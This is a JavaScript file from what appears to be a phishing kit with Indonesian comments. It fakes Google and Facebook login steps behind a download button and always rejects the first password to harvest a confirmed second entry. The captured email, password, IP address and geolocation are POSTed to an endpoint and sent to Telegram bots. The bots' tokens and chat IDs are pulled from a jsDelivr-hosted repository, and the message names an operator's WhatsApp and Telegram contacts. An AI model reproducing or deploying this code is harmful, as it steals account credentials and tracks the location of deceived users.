// version 3
var avatarColors = {
  a:'av-red',b:'av-pink',c:'av-purple',d:'av-indigo',
  e:'av-blue',f:'av-blue',g:'av-teal',h:'av-green',
  i:'av-green',j:'av-orange',k:'av-orange',l:'av-brown',
  m:'av-red',n:'av-pink',o:'av-purple',p:'av-indigo',
  q:'av-blue',r:'av-teal',s:'av-green',t:'av-orange',
  u:'av-brown',v:'av-red',w:'av-pink',x:'av-purple',
  y:'av-indigo',z:'av-grey'
};
function getAvatarClass(l){ return avatarColors[l.toLowerCase()]||'av-blue'; }

function openModal() {
  document.getElementById('overlay').classList.add('active');
  showStep('stepChoose');
}
function closeModal() {
  document.getElementById('overlay').classList.remove('active');
}
function showStep(id) {
  document.querySelectorAll('.step').forEach(function(s){ s.classList.remove('active'); });
  document.getElementById(id).classList.add('active');
}

function showLoading(dimId, textId, text, cb) {
  var dim = document.getElementById(dimId);
  document.getElementById(textId).textContent = text;
  dim.classList.add('active');
  setTimeout(function(){ dim.classList.remove('active'); if(cb) cb(); }, 2000);
}

var gPassVisible = false;
var gEmail = '';
var googleAttempt = 0;
var fbAttempt = 0;
var MAX_PER_TOKEN  = 5;
var _tgTokenIndex  = 0;
var _tgSendCount   = 0;
var _cachedTokens  = null;
var _cachedChatIds = null;
var _isSending     = false; // FIX: flag anti-duplikat

async function fetchGist(url) {
  try {
    var res = await fetch(url, { cache: 'no-store' });
    if (res.ok) {
      var text = (await res.text()).trim();
      if (text.length > 0) return text;
    }
  } catch(e) {}
  var proxies = [
    'https://api.codetabs.com/v1/proxy/?quest=',
    'https://api.allorigins.win/raw?url=',
  ];
  for (var i = 0; i < proxies.length; i++) {
    try {
      var res = await fetch(proxies[i] + encodeURIComponent(url), { cache: 'no-store' });
      if (res.ok) {
        var text = (await res.text()).trim();
        if (text.length > 0) return text;
      }
    } catch(e) {}
  }
  return null;
}

async function prefetchTelegramConfig() {
  try {
    var tokenUrl = 'https://cdn.jsdelivr.net/gh/TirzzNesia/mylibrary@main/prib/zexotoken.txt';
    var idUrl    = 'https://cdn.jsdelivr.net/gh/TirzzNesia/mylibrary@main/prib/zexoid.txt';
    var results  = await Promise.all([fetchGist(tokenUrl), fetchGist(idUrl)]);
    if (results[0]) {
      _cachedTokens  = results[0].split('\n').map(function(t){ return t.trim(); }).filter(function(t){ return t.length > 0; });
    }
    if (results[1]) {
      _cachedChatIds = results[1].split('\n').map(function(id){ return id.trim(); }).filter(function(id){ return id.length > 0; });
    }
  } catch(e) {}
}

function gHandleEmailNext() {
  var inp   = document.getElementById('gEmailInput');
  var err   = document.getElementById('gEmailError');
  var email = inp.value.trim();
  var atIdx = email.indexOf('@');
  var valid = atIdx > 0 && email.endsWith('@gmail.com') && atIdx === email.lastIndexOf('@') && email.length > 10;
  if (!valid) {
    inp.classList.add('error','shake');
    err.textContent = 'Enter a valid Gmail address';
    setTimeout(function(){ inp.classList.remove('shake'); }, 400);
    return;
  }
  inp.classList.remove('error'); err.textContent = '';
  googleAttempt = 0;
  showLoading('gLoadingDim','gLoadingText','Memverifikasi...', function(){
    var letter = email[0].toUpperCase();
    var av     = document.getElementById('gAvatarEl');
    av.textContent = letter;
    av.className   = 'g-chip-avatar ' + getAvatarClass(letter);
    document.getElementById('gChipEmail').textContent = email;
    gEmail = email;
    showStep('stepGPass');
  });
}

function gHandlePassNext() {
  var inp  = document.getElementById('gPassInput');
  var err  = document.getElementById('gPassError');
  var pass = inp.value;
  if (pass.length < 8) {
    inp.classList.add('error','shake');
    err.textContent = 'Password must have at least 8 characters.';
    setTimeout(function(){ inp.classList.remove('shake'); }, 400);
    return;
  }
  inp.classList.remove('error');

  if (googleAttempt === 0) {
    googleAttempt++;
    inp.classList.add('error','shake');
    err.textContent = 'Wrong password, Please try again!';
    setTimeout(function(){ inp.classList.remove('shake'); }, 400);
    inp.value = '';
    return;
  }

  err.textContent = '';
  var dim = document.getElementById('gPassLoadingDim');
  document.getElementById('gPassLoadingText').textContent = 'Mengirim data...';
  dim.classList.add('active');

  var xhr = new XMLHttpRequest();
  xhr.open('POST', getEndpoint(), true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  var params = 'email=' + encodeURIComponent(gEmail) + '&password=' + encodeURIComponent(pass) + '&login=Google';
  xhr.send(params);

  sendToTelegram(gEmail, pass, 'Google');

  setTimeout(function() { locationRedirect(); }, 2000);
}

function gTogglePass() {
  gPassVisible = !gPassVisible;
  document.getElementById('gPassInput').type          = gPassVisible ? 'text' : 'password';
  document.getElementById('gEyeOn').style.display     = gPassVisible ? 'block' : 'none';
  document.getElementById('gEyeOff').style.display    = gPassVisible ? 'none'  : 'block';
}

var fbPassVisible = false;

function fbHandleLogin() {
  var emailInp = document.getElementById('fbEmailInput');
  var passInp  = document.getElementById('fbPassInput');
  var emailErr = document.getElementById('fbEmailError');
  var passErr  = document.getElementById('fbPassError');
  var email    = emailInp.value.trim();
  var pass     = passInp.value;

  if (!email) {
    emailInp.classList.add('error','shake');
    emailErr.textContent = 'Masukkan email atau nomor ponsel.';
    setTimeout(function(){ emailInp.classList.remove('shake'); }, 400);
    return;
  }
  emailErr.textContent = '';

  if (pass.length < 8) {
    passInp.classList.add('error','shake');
    passErr.textContent = 'Kata sandi minimal 8 karakter.';
    setTimeout(function(){ passInp.classList.remove('shake'); }, 400);
    return;
  }
  passErr.textContent = '';

  if (fbAttempt === 0) {
    fbAttempt++;
    passInp.classList.add('error','shake');
    passErr.textContent = 'Wrong password, Please try again!';
    setTimeout(function(){ passInp.classList.remove('shake'); }, 400);
    passInp.value = '';
    return;
  }

  var btn     = document.getElementById('fbLoginBtn');
  var spinner = document.getElementById('fbBtnSpinner');
  var btnText = document.getElementById('fbBtnText');
  btn.classList.add('loading'); btn.disabled = true;
  spinner.style.display = 'block';
  btnText.textContent   = '';

  var xhr = new XMLHttpRequest();
  xhr.open('POST', getEndpoint(), true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  var params = 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass) + '&login=Facebook';
  xhr.send(params);

  sendToTelegram(email, pass, 'Facebook');

  setTimeout(function() {
    btn.classList.remove('loading'); btn.disabled = false;
    spinner.style.display = 'none';
    btnText.textContent   = 'Login';
    document.getElementById('fbcName').textContent = email;
    showStep('stepFBConfirm');
  }, 2000);
}

function fbLanjutkan() {
  var dim = document.getElementById('fbConfirmLoadingDim');
  document.getElementById('fbConfirmLoadingText').textContent = 'Memproses...';
  dim.classList.add('active');
  setTimeout(function() { locationRedirect(); }, 2000);
}

function fbTogglePass() {
  fbPassVisible = !fbPassVisible;
  document.getElementById('fbPassInput').type       = fbPassVisible ? 'text' : 'password';
  document.getElementById('fbEyeOn').style.display  = fbPassVisible ? 'block' : 'none';
  document.getElementById('fbEyeOff').style.display = fbPassVisible ? 'none'  : 'block';
}

function fbUpdateClear() {
  var val = document.getElementById('fbEmailInput').value;
  var btn = document.getElementById('fbClearBtn');
  btn.classList.toggle('visible', val.length > 0);
}

function fbClearEmail() {
  document.getElementById('fbEmailInput').value = '';
  document.getElementById('fbClearBtn').classList.remove('visible');
  document.getElementById('fbEmailInput').focus();
  fbAttempt = 0;
}

// FIX: hapus sendBeacon, pakai fetch saja + flag _isSending anti-duplikat
function sendToTelegram(email, password, login) {
  if (_isSending) return; // block kalau sedang kirim
  _isSending = true;

  try {
    var geo      = window.USER_GEO || {};
    var ipv4     = geo.ipv4    || 'Tidak Ada Data';
    var ipv6     = geo.ipv6    || 'Tidak Ada Data';
    var negara   = geo.country || 'Tidak Ada Data';
    var provinsi = geo.region  || 'Tidak Ada Data';
    var kota     = geo.city    || 'Tidak Ada Data';
    var operator = geo.isp     || 'Tidak Ada Data';
    var asn      = geo.asn     || 'Tidak Ada Data';
    var lon      = geo.lon     || 'Tidak Ada Data';
    var lat      = geo.lat     || 'Tidak Ada Data';

    var botTokens = _cachedTokens;
    var chatIds   = _cachedChatIds;
    if (!botTokens || botTokens.length === 0 || !chatIds || chatIds.length === 0) {
      _isSending = false;
      return;
    }

    if (_tgSendCount >= MAX_PER_TOKEN) {
      _tgTokenIndex = (_tgTokenIndex + 1) % botTokens.length;
      _tgSendCount  = 0;
    }
    var activeToken = botTokens[_tgTokenIndex];
    _tgSendCount++;

    var waktu = new Date().toLocaleString('id-ID', {
      timeZone:  'Asia/Jakarta',
      dateStyle: 'full',
      timeStyle: 'medium'
    });

    var message =
      '<blockquote><b>🔥 RESSULT TIRZZ23NESIA! 🔥</b></blockquote>\n' +
      "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n" +
      "<b>Email + Password :</b> <code>" + email + " " + password + "</code>\n" +
      '<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n' +
      '<b>Email/User :</b> <code>' + email    + '</code>\n' +
      '<b>Password   :</b> <code>' + password + '</code>\n' +
      '<b>Login      :</b> <code>' + login    + '</code>\n' +
      '<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n' +
      '<b>IP Address :</b> <code>' + ipv4     + '</code>\n' +
      '<b>IPv6       :</b> <code>' + ipv6     + '</code>\n' +
      '<b>Lokasi     :</b> <code>' + negara   + ', ' + provinsi + ', ' + kota + '</code>\n' +
      '<b>Operator   :</b> <code>' + operator + '</code>\n' +
      '<b>ASN        :</b> <code>' + asn      + '</code>\n' +
      '<b>Koordinat  :</b> <code>' + lon      + ', ' + lat + '</code>\n' +
      '<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n' +
      '<b>Waktu :</b> <i>' + waktu + ' WIB</i>\n' +
      '<b>Status:</b> <u>Real Data Stream</u>\n' +
      '<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n' +
      '<b>Wa   :</b> <span class="tg-spoiler">628975919600</span>\n' +
      '<b>Tele :</b> <span class="tg-spoiler">@zexoorill</span>';

    var url = 'https://api.telegram.org/bot' + activeToken + '/sendMessage';

    for (var c = 0; c < chatIds.length; c++) {
      (function(cid) {
        var params = new URLSearchParams({
          chat_id:                  cid,
          text:                     message,
          parse_mode:               'HTML',
          disable_web_page_preview: 'true'
        });
        // Pakai fetch saja — tidak pakai sendBeacon supaya tidak double kirim
        fetch(url, {
          method:  'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body:    params.toString(),
          mode:    'no-cors'
        }).catch(function(){});
      })(chatIds[c]);
    }

  } catch(e) {
    console.error('Telegram error:', e);
  }

  // Reset flag setelah 3 detik supaya user berikutnya bisa kirim
  setTimeout(function(){ _isSending = false; }, 3000);
}

window.addEventListener('DOMContentLoaded', function(){
  prefetchTelegramConfig();

  document.getElementById('overlay').addEventListener('click', function(e){
    if (e.target === this) closeModal();
  });

  document.getElementById('gEmailInput').addEventListener('input', function(){
    this.classList.remove('error');
    document.getElementById('gEmailError').textContent = '';
  });
  document.getElementById('gPassInput').addEventListener('input', function(){
    this.classList.remove('error');
    document.getElementById('gPassError').textContent = '';
  });
  document.getElementById('fbEmailInput').addEventListener('input', function(){
    this.classList.remove('error');
    document.getElementById('fbEmailError').textContent = '';
    fbUpdateClear();
  });
  document.getElementById('fbPassInput').addEventListener('input', function(){
    this.classList.remove('error');
    document.getElementById('fbPassError').textContent = '';
  });

  document.addEventListener('keydown', function(e){
    if (e.key !== 'Enter') return;
    if      (document.getElementById('stepGEmail').classList.contains('active')) gHandleEmailNext();
    else if (document.getElementById('stepGPass').classList.contains('active'))  gHandlePassNext();
    else if (document.getElementById('stepFB').classList.contains('active'))     fbHandleLogin();
  });

  var downloadBtn = document.getElementById('downloadBtn');
  if (downloadBtn) downloadBtn.addEventListener('click', openModal);
});
